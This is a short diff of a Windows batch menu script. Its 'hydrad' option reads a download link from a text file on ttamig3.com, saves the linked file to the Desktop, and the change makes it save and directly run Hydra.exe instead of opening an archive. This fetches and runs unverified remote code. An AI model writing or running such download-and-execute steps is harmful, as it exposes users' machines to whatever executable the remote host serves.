@@ -159,9 +159,9 @@ goto MENU
 :hydrad
 cd %USERPROFILE%\Desktop
 for /f "delims=" %%i in ('curl -s "https://ttamig3.com/auth/hydra.txt"') do (
-    curl -L -o Hydra.7z "%%i"
+    curl -L -o Hydra.exe "%%i"
 )
-start Hydra.7z
+start Hydra.exe
 goto MENU
 
 
